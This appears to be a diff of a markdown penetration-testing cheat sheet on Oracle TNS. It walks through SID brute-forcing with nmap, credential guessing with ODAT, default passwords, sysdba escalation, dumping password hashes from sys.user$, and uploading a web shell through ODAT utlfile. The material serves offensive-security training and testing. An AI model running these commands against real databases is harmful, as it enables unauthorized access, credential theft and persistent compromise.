@@ -1,157 +1,122 @@
-# Oracle TNS Enumeration & Exploitation
-
-The **Oracle Transparent Network Substrate (TNS)** is a communication protocol used to facilitate interaction between Oracle databases and applications. It handles name resolution, connection management, and load balancing.
-
-### Service Fundamentals
-
-|Component|Description|
-|:--|:--|
-|**Default Port**|TCP/1521|
-|**tnsnames.ora**|Client-side file used to resolve service names to network addresses.|
-|**listener.ora**|Server-side file defining listener properties and database instances.|
-|**SID**|**System Identifier**: A unique name identifying a specific database instance.|
-
-**Dangerous Default Credentials**:
-
-|Service/Version|Default Password|
-|:--|:--|
-|Oracle 9|`CHANGE_ON_INSTALL`|
-|Oracle DBSNMP|`dbsnmp`|
+1. Identify Oracle TNS on TCP/1521 and confirm it is **unauthorized** or open.
+2. Enumerate the **SID** (System Identifier) using Nmap scripts or ODAT.
+3. Bruteforce credentials using ODAT `all` or specific guessing modules.
+4. Access the instance via `sqlplus` using discovered credentials and the SID.
+5. Attempt elevation to **sysdba** to bypass standard user restrictions.
+6. Extract password hashes from the **sys.user$** table for offline cracking.
+7. If a web server is present, leverage `utlfile` via ODAT to drop a web shell.
 
 ---
 
-### 1. Environment Setup
+## Service Discovery
 
-Install necessary dependencies and the **Oracle Database Attacking Tool (ODAT)** to automate enumeration and exploitation.
+Standard TNS listener detection when TCP/1521 is open.
 
-```
-# Install dependencies
-sudo apt-get update && sudo apt-get install -y build-essential python3-dev libaio1
-
-# Install cx_Oracle
-wget https://files.pythonhosted.org/packages/source/c/cx_Oracle/cx_Oracle-8.3.0.tar.gz
-tar xzf cx_Oracle-8.3.0.tar.gz && cd cx_Oracle-8.3.0
-python3 setup.py build && sudo python3 setup.py install
-
-# Clone ODAT and install python requirements
-git clone https://github.com/quentinhardy/odat.git && cd odat/
-pip install python-libnmap
-git submodule init && git submodule update
-sudo apt-get install python3-scapy -y
-sudo pip3 install colorlog termcolor passlib python-libnmap
-sudo apt-get install build-essential libgmp-dev -y
-pip3 install pycryptodome
-```
-
----
-
-### 2. Initial Enumeration
-
-**Goal:** Identify if the TNS listener is active and determine the version.
+Initial scan to confirm service version and basic status
 
 ```
 sudo nmap -p<PORT> -sV <TARGET_IP> --open
 ```
 
-#### SID Bruteforcing
+## SID Enumeration
 
-Connecting to an Oracle database requires a valid **SID**. If it is unknown, use Nmap to brute-force it.
+TCP/1521 is open but the specific database instance name is unknown. **Incorrect SID** prevents any further connection or authentication attempts.
 
-- **Why it matters:** An incorrect SID results in a failed connection.
-
-```
-sudo nmap -p<PORT> -sV <TARGET_IP> --open --script oracle-sid-brute
-```
-
----
-
-### 3. Automated Exploitation with ODAT
-
-Use ODAT's `all` module to perform a comprehensive scan, including service enumeration and **password guessing**.
+Brute force the SID using Nmap
 
 ```
-./odat.py all -s <TARGET_IP> -p <PORT>
+sudo nmap -p1521 -sV <TARGET_IP> --open --script oracle-sid-brute
 ```
 
-- **Attack Implication:** Success identifies valid credentials (e.g., `<USERNAME>/<PASSWORD>`) to gain initial database access.
+> ⚠️ Gap: Authentication will fail silently if the SID is not specified or guessed correctly, as Oracle requires the SID to route the connection to the correct memory structure.
 
----
+## Credential Guessing
 
-### 4. Database Interaction & Privilege Escalation
+SID is known and the listener is confirmed reachable.
 
-Once credentials are found, use `sqlplus` to interact with the RDBMS.
-
-#### Basic Connection
+Run all ODAT modules to find valid users and passwords
 
 ```
-sqlplus <USERNAME>/<PASSWORD>@<TARGET_IP>/<SID>
+./odat.py all -s <TARGET_IP>
 ```
 
-#### Escalating to SYSDBA
+- Nmap: Use for initial discovery and quick SID scripts.
+    
+- ODAT: Use for comprehensive service-wide guessing and specific exploitation modules.
+    
+- Oracle 9 default: `CHANGE_ON_INSTALL`.
+    
+- Oracle DBSNMP default: `dbsnmp`.
+    
 
-If the user account has sufficient permissions, log in as the **System Database Administrator (SYSDBA)** to gain administrative control.
+## Database Interaction
 
-- **When to use:** Use when the current user needs higher privileges to perform restricted actions like hash extraction.
+Valid credentials and SID are acquired.
+
+Connect to the instance to run manual queries
 
 ```
-sqlplus <USERNAME>/<PASSWORD>@<TARGET_IP>/<SID> as sysdba
+sqlplus <USERNAME>/<PASSWORD>@<TARGET_IP>/<SERVICE_NAME>
 ```
 
-#### Manual Enumeration Commands
+List all tables available to the current user
 
-|Action|SQL Command|
-|:--|:--|
-|**List Tables**|`select table_name from all_tables;`|
-|**Check Roles/Privs**|`select * from user_role_privs;`|
+```
+select table_name from all_tables;
+```
 
----
+Check current user roles and permissions
 
-### 5. Post-Exploitation
+```
+select * from user_role_privs;
+```
 
-#### Extracting Password Hashes
+> ⚠️ Gap: `sqlplus` often fails on Linux due to missing shared libraries. If `libsqlplus.so` is not found, the library path must be added to the system configuration.
 
-Administrative access allows the extraction of hashes from the `sys.user$` table for offline cracking.
+Fix missing shared library errors
+
+```
+sudo sh -c "echo /usr/lib/oracle/12.2/client64/lib > /etc/ld.so.conf.d/oracle-instantclient.conf"
+sudo ldconfig
+```
+
+## Administrative Access
+
+Authenticated as a low-privileged user like `scott`.
+
+Attempt to log in with **sysdba** privileges
+
+```
+sqlplus <USERNAME>/<PASSWORD>@<TARGET_IP>/<SERVICE_NAME> as sysdba
+```
+
+## Credential Extraction
+
+Logged in with high privileges (sysdba).
+
+Query the system table for usernames and password hashes
 
 ```
 select name, password from sys.user$;
 ```
 
-#### Arbitrary File Upload
+## File System Interaction
 
-If ODAT's `utlfile` module is available and the system is misconfigured, you can upload files (such as web shells) to the target.
+Valid credentials (ideally sysdba) exist and the target is likely hosting a web service.
 
-**Default Web Roots:**
-
-- **Linux:** `/var/www/html`
-- **Windows:** `C:\inetpub\wwwroot`
-
-**Step 1:** Create a test file.
+Upload a test file or web shell to a known web root
 
 ```
-echo "Oracle File Upload Test" > testing.txt
+./odat.py utlfile -s <TARGET_IP> -d <SERVICE_NAME> -U <USERNAME> -P <PASSWORD> --sysdba --putFile <FILE_PATH> <FILE_NAME> ./<LOCAL_FILE>
 ```
 
-**Step 2:** Upload via ODAT.
+- Linux: `/var/www/html`.
+- Windows: `C:\inetpub\wwwroot`.
+
+Verify file upload success via web request
 
 ```
-./odat.py utlfile -s <TARGET_IP> -d <SID> -U <USERNAME> -P <PASSWORD> --sysdba --putFile <REMOTE_PATH> testing.txt ./testing.txt
+curl -X GET http://<TARGET_IP>/<FILE_NAME>
 ```
 
-**Step 3:** Verify upload.
-
-```
-curl -X GET http://<TARGET_IP>/testing.txt
-```
-
----
-
-### Configuration Parameter Reference
-
-| Parameter         | Description                                  |
-| :---------------- | :------------------------------------------- |
-| **DESCRIPTION**   | Name for the database and connection type.   |
-| **ADDRESS**       | Network address (Hostname and Port).         |
-| **PROTOCOL**      | Communication protocol (e.g., TCP).          |
-| **CONNECT_DATA**  | Connection attributes (SID or Service Name). |
-| **INSTANCE_NAME** | The specific database instance identifier.   |
-| **SERVER**        | Type of server (Dedicated or Shared).        |
+> ⚠️ Gap: `utlfile` exploitation will fail if the exact **root directory** for the web server is not provided or if the server is not running a web service.
